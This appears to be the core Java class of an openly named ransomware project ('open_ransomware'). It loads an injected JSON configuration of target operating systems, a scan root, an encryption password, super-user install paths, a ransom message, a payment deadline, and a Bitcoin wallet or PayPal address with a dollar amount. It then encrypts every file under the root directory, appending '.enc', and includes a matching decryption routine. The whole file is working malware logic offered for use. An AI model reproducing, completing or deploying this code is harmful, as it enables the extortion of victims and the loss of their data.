package com.bechris100.open_ransomware.software;

import com.bechris100.open_ransomware.Configuration;
import com.bechris100.open_ransomware.ResourceManager;
import com.bechris100.open_ransomware.billing.BillingType;
import com.bechris100.open_ransomware.utils.FileUtil;
import com.bechris100.open_ransomware.utils.OperatingSystem;
import com.bechris100.open_ransomware.utils.RuntimeEnvironment;
import com.bechris100.open_ransomware.utils.Utility;
import org.jetbrains.annotations.NotNull;
import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class Ransomware {

    /*
    This initializes the Configurations upon starting up
     */
    public static void applyInjectJson(String jsonBody) {
        JSONObject root = new JSONObject(jsonBody);

        // Tab "OperatingSystems"
        JSONObject operatingSystemRoot = root.getJSONObject("OperatingSystems");
        JSONArray operatingSystemSupports = operatingSystemRoot.getJSONArray("Supports");
        if (operatingSystemSupports.length() == 0)
            throw new RuntimeException("No Operating System to support for");

        List<String> supportList = new ArrayList<>();
        for (int i = 0; i < operatingSystemSupports.length(); i++)
            supportList.add(operatingSystemSupports.getString(i));

        Configuration.OperatingSystem.SUPPORTED = supportList;
        String targetSystem = operatingSystemRoot.getString("Targets");
        if (targetSystem.equals("*"))
            Configuration.OperatingSystem.TARGETS = Utility.fromList(supportList, ";");
        else {
            boolean found = false;

            for (String supportItem : supportList) {
                if (targetSystem.equalsIgnoreCase(supportItem)) {
                    found = true;
                    break;
                }
            }

            if (!found)
                throw new RuntimeException("The Target System does not contain in the Support List");

            Configuration.OperatingSystem.TARGETS = targetSystem;
        }

        // Tab "Encryption"
        JSONObject encryptionRoot = root.getJSONObject("Encryption");
        Configuration.Encryption.SPAWN_THREADS = encryptionRoot.getBoolean("SpawnThreads");
        Configuration.Encryption.ROOT_DIR = Utility.formatString(encryptionRoot.getString("RootScan"));
        Configuration.Encryption.PASSWORD = encryptionRoot.getString("Password");

        // Tab "ExtractLocations"
        JSONObject locationRoot = root.getJSONObject("ExtractLocations");
        Configuration.ExtractLocation.MAKE_DIRS = locationRoot.getBoolean("MakeDirectories");
        Configuration.ExtractLocation.PREFER_SUPER_USER = locationRoot.getBoolean("PreferSuperUserInjection");
        JSONArray locationsArray = locationRoot.getJSONArray("Locations");
        if (locationsArray.length() == 0)
            throw new RuntimeException("No Locations specified");

        for (int i = 0; i < locationsArray.length(); i++) {
            JSONObject locationSubRoot = locationsArray.getJSONObject(i);
            String osFound = locationSubRoot.getString("OperatingSystem");

            if (!((RuntimeEnvironment.isLinux() && osFound.equalsIgnoreCase("Linux")) ||
                    (RuntimeEnvironment.isWindows() && osFound.equalsIgnoreCase("Windows")) ||
                    (RuntimeEnvironment.isMac() && (osFound.equalsIgnoreCase("MacOS") ||
                            osFound.equalsIgnoreCase("Mac") ||
                            osFound.equalsIgnoreCase("Mac_OS") ||
                            osFound.equalsIgnoreCase("Mac-OS")))))
                continue;

            if (RuntimeEnvironment.isMac())
                Configuration.ExtractLocation.Locations.OPERATING_SYSTEM = OperatingSystem.MAC_OS;
            else if (RuntimeEnvironment.isLinux())
                Configuration.ExtractLocation.Locations.OPERATING_SYSTEM = OperatingSystem.LINUX;
            else if (RuntimeEnvironment.isWindows())
                Configuration.ExtractLocation.Locations.OPERATING_SYSTEM = OperatingSystem.WINDOWS;

            Configuration.ExtractLocation.Locations.SUPER_USER_LOCATION = Utility.formatString(locationSubRoot.getString("SuperUserPath"));
            Configuration.ExtractLocation.Locations.LOCAL_USER_LOCATION = Utility.formatString(locationSubRoot.getString("LocalUserPath"));
        }

        if (Configuration.ExtractLocation.Locations.SUPER_USER_LOCATION.isEmpty() &&
                Configuration.ExtractLocation.Locations.LOCAL_USER_LOCATION.isEmpty())
            throw new RuntimeException("No Locations could be specified");

        // Tab "InjectionConfigs"
        JSONObject injectConfigsRoot = root.getJSONObject("InjectionConfigs");
        String injectConfigsMessage = injectConfigsRoot.getString("DisplayMessageFile");
        if (ResourceManager.resourceExists(injectConfigsMessage))
            Configuration.InjectionConfigs.RES_MESSAGE_FILE = injectConfigsMessage;
        else
            throw new RuntimeException("The configuration message file \"" + injectConfigsMessage + "\" was not found in the JAR");

        JSONObject timeoutRoot = injectConfigsRoot.getJSONObject("Timeout");
        Configuration.InjectionConfigs.Timeout.ENABLED = timeoutRoot.getBoolean("Enabled");
        Configuration.InjectionConfigs.Timeout.WEEKS = timeoutRoot.getInt("Weeks");
        Configuration.InjectionConfigs.Timeout.DAYS = timeoutRoot.getInt("Days");
        Configuration.InjectionConfigs.Timeout.HOURS = timeoutRoot.getInt("Hours");
        Configuration.InjectionConfigs.Timeout.MINUTES = timeoutRoot.getInt("Minutes");
        Configuration.InjectionConfigs.Timeout.SECONDS = timeoutRoot.getInt("Seconds");

        // Tab "Billing"
        JSONObject billingTab = root.getJSONObject("Billing");

        String preferredType = billingTab.getString("PreferredType");
        if (preferredType.equalsIgnoreCase("Bitcoin"))
            Configuration.Billing.PREFERRED_TYPE = BillingType.BITCOIN;
        else if (preferredType.equalsIgnoreCase("PayPal"))
            Configuration.Billing.PREFERRED_TYPE = BillingType.PAYPAL;
        else
            throw new RuntimeException("Could not detect billing type \"" + preferredType + "\"");

        JSONObject values = billingTab.getJSONObject("BillingValues");
        Configuration.Billing.BITCOIN_WALLET = values.getString("BitcoinWallet");
        Configuration.Billing.PAYPAL_ADDRESS = values.getString("PayPalEmailAddress");
        Configuration.Billing.AMOUNT_DOLLAR = billingTab.getDouble("MoneyAmountDollar");
    }

    public static void executeEncryption() {
        File check = new File(Configuration.Encryption.ROOT_DIR);
        if (!check.exists()) {
            System.err.println("Root Directory of \"" + check.getPath() + "\" does not exist");
            System.err.println("File Scan aborted");
            System.exit(1);
        }

        Runnable exec = () -> {
            try {
                List<String> filePaths = FileUtil.scanFiles(Configuration.Encryption.ROOT_DIR);
                // Basically, avoid encrypting the same file several times.
                List<String> cachedFilePaths = new ArrayList<>();

                for (String filePath : filePaths) {
                    if (cachedFilePaths.contains(filePath))
                        continue;

                    File file = new File(filePath);

                    if (Configuration.Encryption.SPAWN_THREADS) {
                        new Thread(() -> {
                            try {
                                String outName = file.getPath();
                                if (!(outName.endsWith(".enc") || outName.endsWith(".enc1")))
                                    outName += ".enc";
                                else if (outName.endsWith(".enc"))
                                    outName = outName.replace(".enc", ".enc1");
                                else if (outName.endsWith(".enc1"))
                                    outName = outName.replace(".enc1", ".enc");

                                FileUtil.Encryption.encryptFile(file, Configuration.Encryption.PASSWORD,
                                        new File(outName),
                                        true);
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }).start();
                    } else
                        FileUtil.Encryption.encryptFile(file, Configuration.Encryption.PASSWORD,
                                new File(file.getPath() + ".enc"),
                                true);

                    cachedFilePaths.add(filePath);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        };

        if (Configuration.Encryption.SPAWN_THREADS) {
            Thread th = new Thread(exec);
            th.setUncaughtExceptionHandler((thread, throwable) -> {
                throwable.printStackTrace();
                System.exit(1);
            });
            th.start();
        } else
            exec.run();
    }

    public static void executeDecryption() {
        File check = new File(Configuration.Encryption.ROOT_DIR);
        if (!check.exists()) {
            System.err.println("Root Directory of \"" + check.getPath() + "\" does not exist");
            System.err.println("File Scan aborted");
            System.exit(1);
        }

        Runnable exec = () -> {
            try {
                List<String> filePaths = FileUtil.scanFiles(Configuration.Encryption.ROOT_DIR);
                // Basically, avoid encrypting the same file several times.
                List<String> cachedFilePaths = new ArrayList<>();

                for (String filePath : filePaths) {
                    if (cachedFilePaths.contains(filePath))
                        continue;

                    File file = new File(filePath);

                    if (Configuration.Encryption.SPAWN_THREADS) {
                        new Thread(() -> {
                            try {
                                FileUtil.Encryption.decryptFile(file, Configuration.Encryption.PASSWORD,
                                        new File(file.getPath().replaceFirst(".enc", "")), true);
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }).start();
                    } else
                        FileUtil.Encryption.decryptFile(file, Configuration.Encryption.PASSWORD,
                                new File(file.getPath().replaceFirst(".enc", "")),
                                true);

                    cachedFilePaths.add(filePath);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        };

        if (Configuration.Encryption.SPAWN_THREADS)
            new Thread(exec).start();
        else
            exec.run();
    }

}
